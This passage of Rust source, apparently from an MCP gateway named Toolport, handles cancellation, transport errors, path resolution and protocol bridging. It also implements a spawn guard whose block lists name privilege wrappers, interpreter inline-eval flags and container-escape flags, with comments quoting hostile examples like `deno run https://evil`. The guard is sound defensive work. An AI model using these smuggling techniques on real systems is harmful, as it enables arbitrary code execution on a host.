    std::sync::atomic::AtomicUsize::new(0);
const MAX_CANCEL_THREADS: usize = 64;

impl CancelEntry {
    fn send_cancel_async(&self, reason: Option<String>) {
        // Reserve a slot; if too many forwards are already blocked (a downstream that
        // stopped draining its stdin), drop this one rather than leak another thread.
        if CANCEL_THREADS_INFLIGHT.fetch_add(1, Ordering::SeqCst) >= MAX_CANCEL_THREADS {
            CANCEL_THREADS_INFLIGHT.fetch_sub(1, Ordering::SeqCst);
            eprintln!(
                "toolport: dropping cancellation forward (>{MAX_CANCEL_THREADS} already blocked; \
                 downstream not draining stdin)"
            );
            return;
        }
        let entry = self.clone();
        std::thread::spawn(move || {
            if let Err(err) = entry.send_cancel(reason.as_deref()) {
                eprintln!("toolport: failed to forward cancellation downstream: {err}");
            }
            CANCEL_THREADS_INFLIGHT.fetch_sub(1, Ordering::SeqCst);
        });
    }

    fn send_cancel(&self, reason: Option<&str>) -> Result<(), String> {
        let mut params = serde_json::Map::new();
        params.insert("requestId".to_string(), self.downstream_id.clone());
        if let Some(reason) = reason.filter(|s| !s.trim().is_empty()) {
            params.insert("reason".to_string(), Value::String(reason.to_string()));
        }
        let msg = json!({
            "jsonrpc": "2.0",
            "method": "notifications/cancelled",
            "params": Value::Object(params)
        });
        let mut stdin = self.stdin.lock().map_err(|_| "downstream stdin lock poisoned".to_string())?;
        writeln!(stdin, "{msg}").map_err(|e| e.to_string())?;
        stdin.flush().map_err(|e| e.to_string())
    }
}

fn normalize_cancel_reason(reason: Option<&str>) -> Option<String> {
    reason
        .filter(|s| !s.trim().is_empty())
        .map(std::string::ToString::to_string)
}

fn prepare_cancel_forward(
    state: &mut CancelState,
    client_request_id: &str,
) -> Option<(CancelEntry, Option<String>)> {
    let cancelled = state.cancelled.get_mut(client_request_id)?;
    if cancelled.forwarded {
        return None;
    }
    let entry = state.in_flight.get(client_request_id)?.clone();
    cancelled.forwarded = true;
    Some((entry, cancelled.reason.clone()))
}

impl Drop for CancelGuard {
    fn drop(&mut self) {
        self.registry
            .inner
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .in_flight
            .remove(&self.client_request_id);
    }
}

impl TransportError {
    /// True if this reflects the server being unreachable/unhealthy (timeout, dead
    /// connection, or exhausted connection/rate-limit retries) rather than a normal
    /// protocol or application error. Only these trip the per-server circuit breaker.
    ///
    /// [`TransportError::Rpc`] is deliberately excluded, same as [`TransportError::Fatal`]:
    /// a server that answers with an error response is alive and well-behaved.
    pub fn is_health_failure(&self) -> bool {
        matches!(self, TransportError::Unavailable(_) | TransportError::Retry { .. })
    }

    /// The JSON-RPC `code`, when the failure was an error *response* from the
    /// server rather than a transport problem.
    ///
    /// The 2026-07-28 compatibility ladder is defined entirely in terms of this
    /// code, which is why the error object is preserved structurally instead of
    /// being flattened into a message string (SOU-445).
    pub fn rpc_code(&self) -> Option<i64> {
        match self {
            TransportError::Rpc(err) => err.get("code").and_then(Value::as_i64),
            _ => None,
        }
    }

    /// True when the server answered with an error only a *modern* (2026-07-28 or
    /// later) implementation produces.
    ///
    /// This is the pivot of the backward-compatibility probe: a recognized modern
    /// error means the server IS modern and the client must correct the request
    /// (usually by retrying with a mutually supported version) rather than
    /// falling back to the legacy `initialize` handshake. Anything else - an
    /// unrecognized error, or no response at all - identifies a legacy server.
    pub fn is_modern_protocol_error(&self) -> bool {
        matches!(
            self.rpc_code(),
            Some(HEADER_MISMATCH)
                | Some(MISSING_REQUIRED_CLIENT_CAPABILITY)
                | Some(UNSUPPORTED_PROTOCOL_VERSION)
        )
    }

    /// Protocol versions a server advertised in an `UnsupportedProtocolVersionError`.
    pub fn supported_versions(&self) -> Vec<String> {
        let TransportError::Rpc(err) = self else {
            return Vec::new();
        };
        err.get("data")
            .and_then(|d| d.get("supported"))
            .and_then(Value::as_array)
            .map(|versions| {
                versions
                    .iter()
                    .filter_map(Value::as_str)
                    .map(str::to_string)
                    .collect()
            })
            .unwrap_or_default()
    }
}

impl std::fmt::Display for TransportError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            TransportError::Fatal(msg) => write!(f, "{msg}"),
            // Rendered exactly as the flattened form was, so nothing user-facing
            // changes now that the error is carried structurally.
            TransportError::Rpc(err) => write!(f, "{err}"),
            TransportError::Unavailable(msg) => write!(f, "{msg}"),
            TransportError::Retry { message, .. } => write!(f, "{message}"),
        }
    }
}

impl From<String> for TransportError {
    fn from(s: String) -> Self {
        TransportError::Fatal(s)
    }
}

/// Read up to `max` bytes of a ureq response body, lossily as text, never more than
/// the cap even if the server keeps streaming.
fn read_capped(resp: ureq::Response, max: u64) -> String {
    let mut buf = Vec::new();
    let _ = resp.into_reader().take(max).read_to_end(&mut buf);
    String::from_utf8_lossy(&buf).into_owned()
}

/// Exponential backoff for retry `attempt` (0-based): base * 2^attempt, capped.
pub(crate) fn backoff_delay(attempt: u32) -> Duration {
    let mult = 1u32 << attempt.min(6);
    HTTP_RETRY_BASE.saturating_mul(mult).min(HTTP_RETRY_CAP)
}

/// Parse a `Retry-After` value in delta-seconds form (the common 429 form),
/// capped so a hostile or misconfigured server can't park a call for minutes.
fn retry_after_delay(value: &str) -> Option<Duration> {
    value
        .trim()
        .parse::<u64>()
        .ok()
        .map(|s| Duration::from_secs(s).min(HTTP_RETRY_CAP))
}

/// True for transport errors where the request never reached the server (DNS or
/// connection failure), so even a non-idempotent `tools/call` is safe to retry.
/// Post-send I/O errors (e.g. a read timeout after the server got the request)
/// are deliberately excluded, since the call may already have run.
fn is_retryable_transport(t: &ureq::Transport) -> bool {
    matches!(
        t.kind(),
        ureq::ErrorKind::Dns | ureq::ErrorKind::ConnectionFailed
    )
}

/// Build an `Authorization` header value from a raw token, adding the `Bearer`
/// scheme unless the caller already included one.
pub fn bearer_header(token: &str) -> String {
    if token.to_lowercase().starts_with("bearer ") {
        token.to_string()
    } else {
        format!("Bearer {token}")
    }
}

/// Resolve a bare command to a concrete executable.
///
/// On Windows, Node tooling lives in `.cmd` shims (`npx` is really `npx.cmd`),
/// and `Command::new("npx")` won't find it. Search PATH with PATHEXT so bare
/// commands resolve. (Rust 1.77.2+ then runs the resolved `.cmd` via cmd.exe.)
#[cfg(windows)]
pub fn resolve_command(command: &str) -> String {
    let p = Path::new(command);
    if p.extension().is_some() || command.contains('\\') || command.contains('/') {
        return command.to_string();
    }
    let exts = std::env::var("PATHEXT").unwrap_or_else(|_| ".COM;.EXE;.BAT;.CMD".to_string());
    if let Ok(path) = std::env::var("PATH") {
        for dir in path.split(';').filter(|d| !d.is_empty()) {
            for ext in exts.split(';').filter(|e| !e.is_empty()) {
                let candidate = Path::new(dir).join(format!("{command}{ext}"));
                if candidate.is_file() {
                    return candidate.to_string_lossy().into_owned();
                }
            }
        }
    }
    command.to_string()
}

/// A PATH that includes the user's real shell PATH plus common install dirs.
/// Expand a per-server working directory string (issue #239): a leading `~`
/// (or `~/`) becomes the home dir, and `${VAR}` is replaced with the environment
/// value (unset vars expand to empty). Returns the expanded path; the caller
/// validates it before setting the child's cwd.
pub fn expand_cwd(dir: &str) -> std::path::PathBuf {
    // Env vars first, so `~` inside an expanded value is still honored below.
    let mut out = String::with_capacity(dir.len());
    let bytes = dir.as_bytes();
    let mut i = 0;
    while i < dir.len() {
        if bytes[i] == b'$' && dir[i..].starts_with("${") {
            if let Some(end) = dir[i + 2..].find('}') {
                let name = &dir[i + 2..i + 2 + end];
                out.push_str(&std::env::var(name).unwrap_or_default());
                i += 2 + end + 1;
                continue;
            }
        }
        out.push(dir[i..].chars().next().unwrap());
        i += dir[i..].chars().next().unwrap().len_utf8();
    }
    // Leading `~` -> home dir.
    if out == "~" || out.starts_with("~/") || out.starts_with("~\\") {
        if let Some(home) = dirs::home_dir() {
            let rest = out[1..].trim_start_matches(['/', '\\']);
            return if rest.is_empty() { home } else { home.join(rest) };
        }
    }
    std::path::PathBuf::from(out)
}

fn empty_cwd_variables(dir: &str) -> Vec<String> {
    let mut names = Vec::new();
    let mut rest = dir;
    while let Some(start) = rest.find("${") {
        rest = &rest[start + 2..];
        let Some(end) = rest.find('}') else { break };
        let name = &rest[..end];
        if name != "ROOT" && std::env::var_os(name).is_none_or(|value| value.is_empty()) {
            names.push(name.to_string());
        }
        rest = &rest[end + 1..];
    }
    names.sort();
    names.dedup();
    names
}

fn cwd_validation_error(dir: &str, expanded: &Path, empty_variables: &[String]) -> String {
    let mut message = format!(
        "configured working directory {dir:?} expanded to {:?}, but that directory does not exist",
        expanded
    );
    if !empty_variables.is_empty() {
        let variables = empty_variables
            .iter()
            .map(|name| format!("${{{name}}}"))
            .collect::<Vec<_>>()
            .join(", ");
        message.push_str(&format!("; expanded empty environment variables: {variables}"));
    }
    message
}

fn validate_cwd(dir: &str) -> Result<std::path::PathBuf, String> {
    let expanded = expand_cwd(dir);
    if expanded.is_dir() {
        return Ok(expanded);
    }
    Err(cwd_validation_error(dir, &expanded, &empty_cwd_variables(dir)))
}

/// Resolve the reserved `${ROOT}` token in a per-server working directory
/// (issue #239). `${ROOT}` stands for the upstream MCP client's current project
/// directory (its first declared root), resolved here *before* [`expand_cwd`]
/// runs so `${VAR}` expansion can't mistake it for an env var named `ROOT`.
///
/// Returns the cwd string to spawn with, or `None` to inherit the gateway's cwd:
/// - blank config -> `None` (unset)
/// - contains `${ROOT}` with a known `root` -> substituted string
/// - contains `${ROOT}` with no known root (the client declared none, or a
///   context without one such as the desktop probe) -> `None`, so the server
///   falls back to the gateway cwd instead of spawning in the wrong place or
///   being handed a literal `${ROOT}` that would guarantee a spawn failure
/// - no `${ROOT}` -> the (trimmed) config unchanged
pub fn resolve_root_token(cwd: &str, root: Option<&str>) -> Option<String> {
    let trimmed = cwd.trim();
    if trimmed.is_empty() {
        return None;
    }
    if trimmed.contains("${ROOT}") {
        root.map(|r| trimmed.replace("${ROOT}", r))
    } else {
        Some(trimmed.to_string())
    }
}

/// Decode a `file://` URI (the form MCP roots report) to a filesystem path
/// string (issue #239). Uses `url::Url::to_file_path`, which handles the local
/// platform's conventions: POSIX (`file:///home/x`), Windows drive letters
/// (`file:///C:/x`), UNC hosts (`file://server/share`), and percent-decoding.
/// Returns `None` for a non-`file` URI or one that can't be converted to a path.
/// A stdio gateway and its client run on the same machine (this feature is
/// stdio-only), so decoding on the local platform is always correct.
pub fn file_uri_to_path(uri: &str) -> Option<String> {
    let parsed = url::Url::parse(uri).ok()?;
    if parsed.scheme() != "file" {
        return None;
    }
    parsed.to_file_path().ok().map(|p| p.to_string_lossy().into_owned())
}

/// macOS GUI apps (and apps they launch, like the client-spawned gateway) inherit
/// only a minimal PATH, so `npx`/`uvx`/`node` aren't found without this. Computed
/// once and cached.
#[cfg(not(windows))]
pub fn augmented_path() -> &'static str {
    use std::sync::OnceLock;
    static CACHED: OnceLock<String> = OnceLock::new();
    CACHED.get_or_init(|| {
        let mut dirs_list: Vec<String> = std::env::var("PATH")
            .ok()
            .map(|p| p.split(':').map(String::from).collect())
            .unwrap_or_default();
        let mut push = |d: String, list: &mut Vec<String>| {
            if !d.is_empty() && !list.iter().any(|x| *x == d) {
                list.push(d);
            }
        };
        // Best effort: the login shell's PATH (covers nvm/asdf/homebrew/volta).
        if let Ok(shell) = std::env::var("SHELL") {
            if let Ok(out) = std::process::Command::new(&shell)
                .args(["-ilc", "printf %s \"$PATH\""])
                .output()
            {
                if out.status.success() {
                    for d in String::from_utf8_lossy(&out.stdout).split(':') {
                        push(d.to_string(), &mut dirs_list);
                    }
                }
            }
        }
        if let Some(home) = dirs::home_dir() {
            for sub in [".local/bin", ".cargo/bin", ".bun/bin"] {
                push(home.join(sub).to_string_lossy().into_owned(), &mut dirs_list);
            }
        }
        for d in ["/usr/local/bin", "/opt/homebrew/bin", "/usr/bin", "/bin"] {
            push(d.to_string(), &mut dirs_list);
        }
        dirs_list.join(":")
    })
}

/// The PATH a downstream child would receive with no launcher rewrite in play.
///
/// Exists so prepending a resolved `node_modules/.bin` cannot change PATH
/// precedence as a side effect: the two platforms already disagree about whether a
/// server's own `env` PATH wins, and that disagreement must not additionally depend
/// on whether the rewrite happened to succeed.
#[cfg(windows)]
fn base_child_path(env: &[(String, String)]) -> String {
    // Windows children inherit the gateway's PATH, and a configured PATH overrides
    // it through `.envs()`. There is no augmented_path() equivalent because .cmd
    // shims and node installs are already on the inherited PATH.
    env.iter()
        .find(|(k, _)| k.eq_ignore_ascii_case("PATH"))
        .map(|(_, v)| v.clone())
        .unwrap_or_else(|| std::env::var("PATH").unwrap_or_default())
}

#[cfg(not(windows))]
fn base_child_path(_env: &[(String, String)]) -> String {
    // Non-Windows overwrites PATH with augmented_path() unconditionally, configured
    // or not, so building on anything else here would silently drop the augmented
    // entries (nvm/asdf/homebrew) for exactly the servers that got rewritten.
    augmented_path().to_string()
}

#[cfg(not(windows))]
pub fn resolve_command(command: &str) -> String {
    if command.contains('/') {
        return command.to_string();
    }
    for dir in augmented_path().split(':').filter(|d| !d.is_empty()) {
        let candidate = Path::new(dir).join(command);
        if candidate.is_file() {
            return candidate.to_string_lossy().into_owned();
        }
    }
    command.to_string()
}

/// What the gateway wants a transport to do with a legacy server-initiated
/// request. Legacy upstream clients still answer immediately; modern clients
/// end the current request with `input_required` and answer on a fresh retry.
#[derive(Clone, Debug, PartialEq)]
pub enum ServerRequestAction {
    Respond(Value),
    InputRequired,
}

/// A bidirectional JSON-RPC channel to one downstream server.
pub type ServerRequestHandler =
    Arc<dyn Fn(&Value) -> Option<ServerRequestAction> + Send + Sync>;

#[derive(Clone, Debug)]
struct PendingLegacyMrtr {
    token: String,
    input_key: String,
    server_request: Value,
    downstream_request_id: Value,
    method: String,
    base_params: Value,
}

static MRTR_BRIDGE_ID: AtomicU64 = AtomicU64::new(1);

fn mrtr_base_params(params: &Value) -> Value {
    let mut params = params.clone();
    if let Some(obj) = params.as_object_mut() {
        obj.remove("_meta");
        obj.remove("inputResponses");
        obj.remove("requestState");
    }
    params
}

fn new_mrtr_bridge_token() -> Result<String, TransportError> {
    let mut bytes = [0u8; 16];
    getrandom::getrandom(&mut bytes).map_err(|_| {
        TransportError::Fatal("secure randomness unavailable for MRTR requestState".to_string())
    })?;
    Ok(base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(bytes))
}

impl PendingLegacyMrtr {
    fn new(
        server_request: Value,
        downstream_request_id: Value,
        method: &str,
        params: &Value,
    ) -> Result<Self, TransportError> {
        Ok(Self {
            token: new_mrtr_bridge_token()?,
            input_key: format!(
                "toolport_input_{}",
                MRTR_BRIDGE_ID.fetch_add(1, Ordering::Relaxed)
            ),
            server_request,
            downstream_request_id,
            method: method.to_string(),
            base_params: mrtr_base_params(params),
        })
    }

    fn input_required(&self) -> Value {
        let mut input = serde_json::Map::new();
        if let Some(method) = self.server_request.get("method") {
            input.insert("method".to_string(), method.clone());
        }
        if let Some(params) = self.server_request.get("params") {
            input.insert("params".to_string(), params.clone());
        }
        json!({
            "resultType": "input_required",
            "inputRequests": {
                self.input_key.clone(): Value::Object(input)
            },
            "requestState": self.token
        })
    }

    fn response_for_retry(
        &self,
        method: &str,
        params: &Value,
    ) -> Result<Option<Value>, TransportError> {
        if method != self.method || mrtr_base_params(params) != self.base_params {
            return Err(TransportError::Rpc(json!({
                "code": -32602,
                "message": "requestState does not belong to this request"
            })));
        }
        if params.get("requestState").and_then(Value::as_str) != Some(self.token.as_str()) {
            return Err(TransportError::Rpc(json!({
                "code": -32602,
                "message": "unknown or expired requestState"
            })));
        }
        let Some(result) = params
            .get("inputResponses")
            .and_then(|responses| responses.get(&self.input_key))
            .cloned()
        else {
            return Ok(None);
        };
        Ok(Some(json!({
            "jsonrpc": "2.0",
            "id": self.server_request.get("id").cloned().unwrap_or(Value::Null),
            "result": result
        })))
    }
}

/// True when a downstream line is a server-initiated JSON-RPC request (has method + id,
/// no result/error). Such messages must be answered on the transport, not skipped.
pub fn is_server_initiated_request(v: &Value) -> bool {
    v.get("method").and_then(|m| m.as_str()).is_some()
        && v.get("id").is_some_and(|id| !id.is_null())
        && v.get("result").is_none()
        && v.get("error").is_none()
}

/// A bidirectional JSON-RPC channel to one downstream server.
pub trait Transport: Send {
    fn request(&mut self, method: &str, params: Value) -> Result<Value, TransportError>;
    /// Standard per-request `_meta` to merge into every outgoing request.
    ///
    /// From 2026-07-28 there is no handshake: each request carries its own
    /// protocol version, client identity, and client capabilities. Setting it
    /// once here means every call site - `fetch_paginated_list`, `tools/call`,
    /// `resources/read`, and anything added later - gets it without repeating
    /// the merge. Default no-op, so legacy connections send exactly what they
    /// always did (SOU-445).
    fn set_protocol_meta(&mut self, _meta: Option<Value>) {}
    /// Replace the long-lived modern notification listener. Legacy transports
    /// keep the default no-op; modern connections call this after discovery and
    /// whenever their resource URI set changes.
    fn set_subscription_listener(
        &mut self,
        _filter: SubscriptionFilter,
    ) -> Result<(), TransportError> {
        Ok(())
    }
    fn request_with_cancel(
        &mut self,
        method: &str,
        params: Value,
        cancel: Option<CancelContext>,
    ) -> Result<Value, TransportError> {
        if cancel.is_some() {
            downstream_trace(&format!(
                "cancellation not supported for downstream transport method {method}"
            ));
        }
        self.request(method, params)
    }
    /// Send a request with transport-level routing headers. Only modern
    /// Streamable HTTP consumes these; stdio and legacy transports deliberately
    /// ignore them.
    fn request_with_cancel_and_headers(
        &mut self,
        method: &str,
        params: Value,
        cancel: Option<CancelContext>,
        _headers: &[(String, String)],
    ) -> Result<Value, TransportError> {
        self.request_with_cancel(method, params, cancel)
    }
    fn supports_request_headers(&self) -> bool {
        false
    }
    fn notify(&mut self, method: &str, params: Value) -> Result<(), TransportError>;
    /// Bound how long a single `request` waits for its response. Used to fail the
    /// connect handshake fast. Default no-op: transports with their own fixed
    /// request timeout (e.g. HTTP) ignore it.
    fn set_read_timeout(&mut self, _timeout: Duration) {}
    /// Budget for the connect handshake's `initialize`. Stdio invocations that
    /// download their package before running (npx and friends) report the long
    /// launcher budget; everything else keeps the tight default so one hung
    /// server can't stall a batch probe.
    fn connect_timeout(&self) -> Duration {
        STDIO_CONNECT_TIMEOUT
    }
    /// Start reacting to the server's own `notifications/tools/list_changed`.
    /// Called once the connect handshake is done, so a server that announces its
    /// tools during startup doesn't trigger a needless rebuild. Default no-op:
    /// transports without a live notification stream ignore it.
    fn arm_tools_watch(&mut self) {}
    /// Handle server→client JSON-RPC (roots/list, sampling, …) by forwarding to the
    /// upstream MCP client. Default no-op: unsupported server requests are ignored.
    fn set_server_request_handler(&mut self, _handler: ServerRequestHandler) {}
}

fn downstream_trace(msg: &str) {
    if crate::brand::env_var_os("TOOLPORT_DEBUG", "CONDUIT_DEBUG").is_none() {
        return;
    }
    let Some(path) = crate::registry::gateway_log_path() else {
        eprintln!("toolport: {msg}");
        return;
    };
    if let Some(parent) = path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    if let Ok(mut file) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
    {
        let _ = writeln!(file, "{msg}");
    }
}

/// Bitmask of which downstream list a `notifications/.../list_changed` announces.
/// The gateway watches one flag per transport and, per set bit, re-queries that
/// list and forwards the matching notification on to the client.
pub mod change {
    pub const TOOLS: u8 = 1;
    pub const RESOURCES: u8 = 2;
    pub const PROMPTS: u8 = 4;
}

/// Which downstream list `line` announces a change to (a [`change`] bit), or 0 if
/// it isn't a `list_changed` notification. Lets the stdout drain spot when a server
/// changes its own tools / resources / prompts mid-session.
fn list_changed_kind(line: &str) -> u8 {
    // Cheap gate: skip the JSON parse for the overwhelming majority of lines
    // (ordinary responses to our requests) that can't be one of these.
    if !line.contains("list_changed") {
        return 0;
    }
    match serde_json::from_str::<Value>(line.trim())
        .ok()
        .as_ref()
        .and_then(|v| v.get("method"))
        .and_then(|m| m.as_str())
    {
        Some("notifications/tools/list_changed") => change::TOOLS,
        Some("notifications/resources/list_changed") => change::RESOURCES,
        Some("notifications/prompts/list_changed") => change::PROMPTS,
        _ => 0,
    }
}

/// True if `line` is specifically a `tools/list_changed` notification.
#[cfg(test)]
fn is_list_changed(line: &str) -> bool {
    list_changed_kind(line) == change::TOOLS
}

/// Extract the resource URI from a `notifications/resources/updated` line, or
/// `None` when the line is not that notification. Distinct from list_changed
/// (SOU-394): resource content changed, not the catalog membership.
fn resource_updated_uri(line: &str) -> Option<String> {
    // Cheap gate: skip JSON parse for ordinary request/response lines.
    if !line.contains("resources/updated") {
        return None;
    }
    let v: Value = serde_json::from_str(line.trim()).ok()?;
    if v.get("method").and_then(|m| m.as_str()) != Some("notifications/resources/updated") {
        return None;
    }
    v.get("params")
        .and_then(|p| p.get("uri"))
        .and_then(|u| u.as_str())
        .filter(|u| !u.is_empty())
        .map(str::to_string)
}

/// Parse a `notifications/progress` line, or `None` if it is anything else.
///
/// Progress relates to one in-flight request and is correlated by the
/// `progressToken` the client minted, so the whole notification is handed to the
/// gateway rather than a single extracted field.
fn progress_notification(line: &str) -> Option<Value> {
    // Cheap gate: skip the JSON parse for ordinary request/response lines.
    if !line.contains("notifications/progress") {
        return None;
    }
    let v: Value = serde_json::from_str(line.trim()).ok()?;
    if v.get("method").and_then(|m| m.as_str()) != Some("notifications/progress") {
        return None;
    }
    // A token is what makes the notification routable; without one it can only be
    // dropped, so filter it here rather than waking the gateway for nothing.
    v.get("params").and_then(|p| p.get("progressToken"))?;
    Some(v)
}

/// Forward one drained stdout line to the request loop, first flagging `dirty` if
/// the server (once `armed`) announced a tool-list change, and invoking the
/// resource-updated sink for `notifications/resources/updated` (SOU-394) and the
/// progress sink for `notifications/progress` (SOU-444). Returns false when the
/// receiver is gone (transport closed) so the drain loop can stop.
fn forward_line(
    line: String,
    tx: &Sender<String>,
    dirty: &Option<Arc<AtomicU8>>,
    armed: &Arc<AtomicBool>,
    resource_updated: &Option<ResourceUpdatedSink>,
    progress: &Arc<Mutex<Option<ProgressSink>>>,
) -> bool {
    if armed.load(Ordering::SeqCst) {
        if let Some(flag) = dirty {
            let kind = list_changed_kind(&line);
            if kind != 0 {
                flag.fetch_or(kind, Ordering::SeqCst);
            }
        }
        if let Some(sink) = resource_updated {
            if let Some(uri) = resource_updated_uri(&line) {
                sink(uri);
            }
        }
        // Parse first: the cheap gate inside keeps this off the hot path, so the
        // lock is only taken for lines that really are progress notifications.
        if let Some(note) = progress_notification(&line) {
            let sink = progress
                .lock()
                .unwrap_or_else(std::sync::PoisonError::into_inner)
                .clone();
            if let Some(sink) = sink {
                sink(note);
            }
        }
    }
    tx.send(line).is_ok()
}

/// Spawn-time supply-chain guard. Toolport runs stdio servers as full-privilege
/// host processes, so this is NOT a sandbox; it refuses the specific *smuggling*
/// techniques where a benign-looking launcher (`node`, `docker`, `sh`) is turned
/// into arbitrary code execution or a privileged container by its arguments. The
/// threat is a booby-trapped server config the member did not author (a team-pushed
/// or registry-imported entry) whose command reads as harmless but whose args
/// inject code. High-precision by design: it only trips on interpreter inline-eval
/// / module-preload flags and container-escape flags, none of which a normal
/// `npx` / `uvx` / binary MCP server needs. Returns `Err(reason)` to block the
/// spawn; the reason surfaces to the member.
/// Wrapper programs that run their first bare argument as the REAL command, so
/// screening only the wrapper name lets `sudo node -e <code>` (or `time`, `flock`, ...)
/// smuggle an interpreter past every check below. Parsing each wrapper's own flags to
/// find the inner command is fragile, and a parse slip is a silent bypass, so we refuse
/// these outright. (`env` is handled specially below so the common `env VAR=val cmd`
/// pattern keeps working.) A server that needs a wrapper ships a dedicated launcher.
const LAUNCHER_WRAPPERS: &[&str] = &[
    "sudo", "doas", "su", "runuser", "pkexec", "time", "nice", "nohup", "xargs",
    "stdbuf", "timeout", "setsid", "ionice", "chrt", "taskset", "setarch", "unbuffer",
    "script", "watch", "flock", "busybox", "proxychains", "proxychains4", "torify",
    "chroot", "capsh", "firejail", "wine",
    // Namespace / privilege / sandbox launchers and debuggers/tracers that also run their
    // first bare argument as the real program (`strace node -e <code>`, `nsenter … <cmd>`),
    // so screening only the wrapper name is the same silent bypass as sudo/time. (`qemu-*`
    // user-mode emulators do the same and are matched by prefix in screen_spawn_command.)
    "nsenter", "unshare", "systemd-run", "setpriv", "gosu", "strace", "ltrace", "gdb",
    "valgrind", "proot", "bwrap", "catchsegv", "eatmydata", "parallel", "rlwrap",
    "dbus-run-session", "xvfb-run",
];

pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String> {
    let base = command_basename(command);
    // `env [VAR=val ...] <cmd> [args]` is a common, legitimate config pattern, so rather
    // than refuse it we peel off the leading assignments (screened like the env field)
    // and screen the real inner command. env with its own flags is unusual and hard to
    // parse safely, so that still fails closed.
    if base == "env" {
        return screen_env_wrapper(args);
    }
    if LAUNCHER_WRAPPERS.contains(&base.as_str()) || base.starts_with("qemu-") {
        return Err(format!(
            "refusing to launch '{command}': wrapper programs like sudo/time/flock run \
             another command from their arguments, which would bypass Toolport's spawn \
             guard. Set environment variables in the server's env field, and name the \
             real program as the command."
        ));
    }
    // Dispatch on the interpreter FAMILY so a versioned or renamed binary
    // (`python3.10`, `python3.10.exe`) screens the same as `python`.
    let dangerous: Option<&str> = match interpreter_family(&base) {
        // Interpreters: inline-eval and module-preload execute attacker-supplied
        // code without a script file on disk. `clustered_eval` additionally catches an
        // eval flag packed into a getopt cluster (`python -Ec`, `ruby -we`, `sh -ec`).
        "node" | "nodejs" => node_dangerous(args),
        "bun" => bun_dangerous(args),
        "deno" => deno_dangerous(args),
        // py/pyw are the Windows Python launchers; they forward `-c` (and version
        // selectors like `-3.11`) to the selected interpreter, so screen them as Python.
        "python" | "python2" | "python3" | "pypy" | "pypy3" | "py" | "pyw" => {
            first_flag(args, &["-c"]).or_else(|| clustered_eval(args, &['c'], PYTHON_BOOL))
        }
        "ruby" => first_flag(args, &["-e"]).or_else(|| clustered_eval(args, &['e'], RUBY_BOOL)),
        "perl" => first_flag(args, &["-e"]).or_else(|| clustered_eval(args, &['e'], PERL_BOOL)),
        // php: -r/-R run inline code (-R lowercases to -r), -B runs code before input.
        "php" => first_flag(args, &["-r", "-b"]),
        "awk" | "gawk" | "mawk" | "nawk" => awk_dangerous(args),
        // More interpreters whose `-e`/`--eval` runs an inline program with no file.
        "osascript" | "elixir" | "iex" | "lua" | "luajit" | "rscript" | "r" | "julia"
        | "groovy" | "scala" | "clojure" | "bb" | "tclsh" | "wish" => {
            first_flag(args, &["-e", "--eval", "--eval-string"])
        }
        // Shells: `-c <string>` runs an arbitrary line, incl. clustered `sh -ec <string>`.
        "sh" | "bash" | "zsh" | "dash" | "ash" | "fish" | "ksh" => {
            first_flag(args, &["-c", "-command", "/c", "/k", "/command"])
                .or_else(|| clustered_eval(args, &['c'], SHELL_BOOL))
        }
        // Windows cmd uses `/c` `/k` switches (not getopt clustering), so no cluster check.
        "cmd" => first_flag(args, &["-c", "-command", "/c", "/k", "/command"]),
        // PowerShell also runs code via `-EncodedCommand` (base64) and any unambiguous
        // abbreviation of `-Command`, none of which an exact-match list catches.
        "pwsh" | "powershell" => pwsh_dangerous(args),
        // Container runtimes: privileged mode, capability/device passthrough, and
        // host-namespace sharing escalate past a normal host process (a plain `-v`
        // mount does not, and stays allowed; see container_escape_flag).
        "docker" | "podman" | "nerdctl" => container_escape_flag(args),
        _ => None,
    };
    match dangerous {
        Some(flag) => Err(format!(
            "refusing to launch '{command}': the argument '{flag}' can execute \
             arbitrary code or escape isolation. Toolport blocks inline-eval and \
             privileged-container flags on spawned servers as a supply-chain guard. \
             If this server is yours and you trust it, run it from a dedicated script \
             or launcher you control instead of an inline command."
        )),
        None => Ok(()),
    }
}

/// Node/Bun eval + module-preload flags, in `--flag[=x]` form AND the attached short
/// form node accepts for require (`-r./pwn.js`), which a plain equality check misses.
fn node_dangerous(args: &[String]) -> Option<&str> {
    const FLAGS: &[&str] = &[
        "-e", "--eval", "-p", "--print", "-r", "--require", "--import", "--loader",
        "--experimental-loader", "--preload",
    ];
    args.iter()
        .find(|a| {
            let al = a.to_ascii_lowercase();
            let head = al.split('=').next().unwrap_or(&al);
            FLAGS.contains(&head)
                // `-r<module>` attached (single dash), e.g. `-r./pwn.js`.
                || (al.starts_with("-r") && al.len() > 2 && !al.starts_with("--"))
        })
        .map(|a| a.as_str())
        // getopt clustering packs `-p` (print) and `-e` (eval): `node -pe '<code>'`.
        .or_else(|| clustered_eval(args, &['e', 'p'], &['i', 'v', 'h']))
}

/// A remote code specifier deno/bun will fetch and execute: an http(s) URL, an
/// `npm:` / `jsr:` registry ref, or a `data:` inline-source URL. `deno run npm:evil`
/// and `deno run 'data:text/javascript,<code>'` run untrusted code the same as
/// `deno run https://evil`, so all are screened.
fn remote_specifier(arg: &str) -> bool {
    let a = arg.to_ascii_lowercase();
    a.starts_with("http://")
        || a.starts_with("https://")
        || a.starts_with("npm:")
        || a.starts_with("jsr:")
        || a.starts_with("data:")
}

/// Walk deno/bun-style args to the operand at or after `from`, skipping option tokens and
/// the value of a known space-separated value option (`--config x`) so the subcommand and
/// its executable target aren't mistaken for an option's value. Returns the operand and its
/// index.
fn next_operand<'a>(args: &'a [String], from: usize, value_opts: &[&str]) -> (Option<&'a str>, usize) {
    let mut j = from;
    while let Some(a) = args.get(j) {
        if a.starts_with('-') {
            if value_opts.contains(&a.as_str()) {
                j += 1; // this option consumes the next token as its value
            }
            j += 1;
        } else {
            return (Some(a.as_str()), j);
        }
    }
    (None, j)
}

/// Deno's lethal invocations are SUBCOMMANDS, not flags: `eval <code>` runs inline code,
/// and `run`/`serve <remote>` executes code fetched from the network or a registry. A
/// `deno run` of a LOCAL script is the normal case and stays allowed. Global value options
/// are skipped so `deno --config x eval …` / `deno --config x run npm:…` can't hide the
/// subcommand, and only the executable TARGET is remote-checked — a URL passed as an
/// application argument (`deno run ./s.ts --url https://api`) is not fetched code.
